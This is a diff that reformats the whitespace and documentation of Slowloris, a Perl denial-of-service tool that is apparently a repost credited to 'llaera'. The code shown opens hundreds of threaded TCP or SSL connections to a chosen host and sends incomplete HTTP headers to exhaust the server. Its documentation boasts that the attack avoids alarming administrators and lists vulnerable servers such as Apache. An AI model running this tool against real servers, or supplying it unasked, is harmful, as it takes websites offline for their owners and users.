@@ -14,17 +14,17 @@ EOTEXT
 my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
 my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
 my $result = GetOptions(
-'shost=s'   => \$shost,
-'dns=s'     => \$host,
-'httpready' => \$httpready,
-'num=i'     => \$connections,
-'cache'     => \$cache,
-'port=i'    => \$port,
-'https'     => \$ssl,
-'tcpto=i'   => \$tcpto,
-'test'      => \$test,
-'timeout=i' => \$timeout,
-'version'   => \$version,
+    'shost=s'   => \$shost,
+    'dns=s'     => \$host,
+    'httpready' => \$httpready,
+    'num=i'     => \$connections,
+    'cache'     => \$cache,
+    'port=i'    => \$port,
+    'https'     => \$ssl,
+    'tcpto=i'   => \$tcpto,
+    'test'      => \$test,
+    'timeout=i' => \$timeout,
+    'version'   => \$version,
 );
 
 if ($version) {
@@ -98,20 +98,20 @@ if ($test) {
     }
     $totaltime = $totaltime / 60;
     print "This test could take up to $totaltime minutes.\n";
-    
+
     my $delay   = 0;
     my $working = 0;
     my $sock;
-    
+
     if ($ssl) {
         if (
             $sock = new IO::Socket::SSL(
-            PeerAddr => "$host",
-            PeerPort => "$port",
-            Timeout  => "$tcpto",
-            Proto    => "tcp",
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
             )
-            )
+          )
         {
             $working = 1;
         }
@@ -119,12 +119,12 @@ if ($test) {
     else {
         if (
             $sock = new IO::Socket::INET(
-            PeerAddr => "$host",
-            PeerPort => "$port",
-            Timeout  => "$tcpto",
-            Proto    => "tcp",
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
             )
-            )
+          )
         {
             $working = 1;
         }
@@ -137,16 +137,16 @@ if ($test) {
             $rand = "";
         }
         my $primarypayload =
-        "GET /$rand HTTP/1.1\r\n"
-        . "Host: $sendhost\r\n"
-        . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
-        . "Content-Length: 42\r\n";
+            "GET /$rand HTTP/1.1\r\n"
+          . "Host: $sendhost\r\n"
+          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+          . "Content-Length: 42\r\n";
         if ( print $sock $primarypayload ) {
             print "Connection successful, now comes the waiting game...\n";
         }
         else {
             print
-            "That's odd - I connected but couldn't send the data to $host:$port.\n";
+"That's odd - I connected but couldn't send the data to $host:$port.\n";
             print "Is something wrong?\nDying.\n";
             exit;
         }
@@ -171,7 +171,7 @@ if ($test) {
             print "\tFailed after $times[$i] seconds.\n";
         }
     }
-    
+
     if ( print $sock "Connection: Close\r\n\r\n" ) {
         print "Okay that's enough time. Slowloris closed the socket.\n";
         print "Use $delay seconds for -timeout.\n";
@@ -184,18 +184,18 @@ if ($test) {
     }
     if ( $delay < 166 ) {
         print <<EOSUCKS2BU;
-        Since the timeout ended up being so small ($delay seconds) and it generally
-        takes between 200-500 threads for most servers and assuming any latency at
-            all...  you might have trouble using Slowloris against this target.  You can
-            tweak the -timeout flag down to less than 10 seconds but it still may not
-            build the sockets in time.
-            EOSUCKS2BU
-            }
+Since the timeout ended up being so small ($delay seconds) and it generally 
+takes between 200-500 threads for most servers and assuming any latency at 
+all...  you might have trouble using Slowloris against this target.  You can 
+tweak the -timeout flag down to less than 10 seconds but it still may not 
+build the sockets in time.
+EOSUCKS2BU
+    }
 }
 else {
     print
-    "Connecting to $host:$port every $timeout seconds with $connections sockets:\n";
-    
+"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";
+
     if ($usemultithreading) {
         domultithreading($connections);
     }
@@ -218,12 +218,12 @@ sub doconnections {
                 if ($ssl) {
                     if (
                         $sock[$z] = new IO::Socket::SSL(
-                        PeerAddr => "$host",
-                        PeerPort => "$port",
-                        Timeout  => "$tcpto",
-                        Proto    => "tcp",
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
                         )
-                        )
+                      )
                     {
                         $working[$z] = 1;
                     }
@@ -234,12 +234,12 @@ sub doconnections {
                 else {
                     if (
                         $sock[$z] = new IO::Socket::INET(
-                        PeerAddr => "$host",
-                        PeerPort => "$port",
-                        Timeout  => "$tcpto",
-                        Proto    => "tcp",
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
                         )
-                        )
+                      )
                     {
                         $working[$z] = 1;
                         $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
@@ -256,10 +256,10 @@ sub doconnections {
                         $rand = "";
                     }
                     my $primarypayload =
-                    "$method /$rand HTTP/1.1\r\n"
-                    . "Host: $sendhost\r\n"
-                    . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
-                    . "Content-Length: 42\r\n";
+                        "$method /$rand HTTP/1.1\r\n"
+                      . "Host: $sendhost\r\n"
+                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+                      . "Content-Length: 42\r\n";
                     my $handle = $sock[$z];
                     if ($handle) {
                         print $handle "$primarypayload";
@@ -312,7 +312,7 @@ sub doconnections {
             }
         }
         print
-        "Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
+"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
         sleep($timeout);
     }
 }
@@ -324,7 +324,7 @@ sub domultithreading {
     my $connectionsperthread = 50;
     while ( $i < $num ) {
         $thrs[$i] =
-        threads->create( \&doconnections, $connectionsperthread, 1 );
+          threads->create( \&doconnections, $connectionsperthread, 1 );
         $i += $connectionsperthread;
     }
     my @threadslist = threads->list();
@@ -334,17 +334,31 @@ sub domultithreading {
 }
 
 __END__
+
 =head1 TITLE
- Slowloris by llaera
- =head1 VERSION
- Version 1.0 Stable
- =head1 DATE
- 02/11/2013
- =head1 AUTHOR
- Laera Loris llaera@outlook.com
- =head1 ABSTRACT
- Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
- =head1 AFFECTS
- Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?
- =head1 NOT AFFECTED
- IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
+
+Slowloris by llaera
+
+=head1 VERSION
+
+Version 1.0 Stable
+
+=head1 DATE
+
+02/11/2013
+
+=head1 AUTHOR
+
+Laera Loris llaera@outlook.com
+
+=head1 ABSTRACT
+
+Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
+
+=head1 AFFECTS
+
+Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?
+
+=head1 NOT AFFECTED
+
+IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
